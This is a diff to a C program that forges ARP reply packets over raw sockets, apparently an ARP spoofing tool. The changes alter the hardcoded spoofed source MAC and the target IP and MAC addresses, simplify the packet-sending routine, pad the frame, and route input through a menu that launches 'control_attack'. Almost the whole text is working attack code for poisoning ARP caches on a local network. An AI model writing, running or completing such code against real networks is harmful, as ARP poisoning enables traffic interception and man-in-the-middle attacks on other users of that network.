@@ -30,10 +30,10 @@ void cleanup(int sock)
 arp_addrs_t init_addrs()
 {
   arp_addrs_t a= {
-    .source_mac={0xDE,0xAD,0xBE,0xEF,0xFE,0xED},
-    .source_ip={192, 168, 0, 160},
-    .target_mac={0x00,0x0c,0x29,0x51,0x40,0xba},
-    .target_ip={192, 168, 0, 172}
+    .source_mac={0xde,0xad,0xbe,0xef,0xfe,0xed},
+    .source_ip={192, 168, 170, 128},
+    .target_mac={0xa2,0x9a,0x8e,0x27,0x10,0x65},
+    .target_ip={192, 168, 170, 1}
   };
   return a;
 
@@ -56,7 +56,6 @@ void set_ether_headers(arp_addrs_t arp_addrs, uint8_t *reply_arp)
   memcpy(reply_arp + 6, arp_addrs.source_mac, 6);   
   reply_arp[12] = 0x08;                     
   reply_arp[13] = 0x06; // EtherType = ARP (0x0806)
-
 }
 
 void set_arp_headers( arp_header_t *arp,arp_addrs_t arp_addrs )
@@ -85,15 +84,11 @@ void set_socket(struct sockaddr_ll * addr, arp_addrs_t arp_addrs)
 
 void send_arp_packets(int sock,uint8_t* reply_arp,struct sockaddr_ll addr, int count)
 {
-  while(count>0)
+
+  if (sendto(sock, reply_arp, ARP_PACKET_SIZE, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
   {
-    if (sendto(sock, reply_arp, ARP_PACKET_SIZE, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
-    {
-      perror("sendto");
-      exit(1);
-    }
-    usleep(50);
-    count--;
+    perror("sendto");
+    exit(1);
   }
 
 }
@@ -111,6 +106,7 @@ void control_attack()
 
   arp_header_t *arp = (arp_header_t *)(reply_arp + 14);
   set_arp_headers(arp, arp_addrs);
+  memset(reply_arp+42,0x00,18);
 
   struct sockaddr_ll addr = {0};
   set_socket(&addr, arp_addrs);
@@ -123,11 +119,10 @@ void control_attack()
 
 }
 
-void arp_attack_handle_user(char option)
+void arp_attack_handle_user(int option_int)
 {
-  int option_int= option;
   switch(option_int){
-  case '2':
+  case 2:
     control_attack();
     break;
   }
@@ -144,13 +139,19 @@ void arp_attack_menu_controller()
     show_arp_attack_menu();
     option = getchar();
     getchar();
+    int option_int= atoi((const char*)&option);
+    if(option_int>3 || option_int<1)
+    {
+      fprintf(stderr, "Choose another option 1-3");
+      continue;
+    }
     printf("User entered: %c\n",option);
-    arp_attack_handle_user(option);
+    arp_attack_handle_user(option_int);
   }
 
 }
 
 int main(){
-  control_attack();
+  arp_attack_menu_controller();
   return 0;
 }
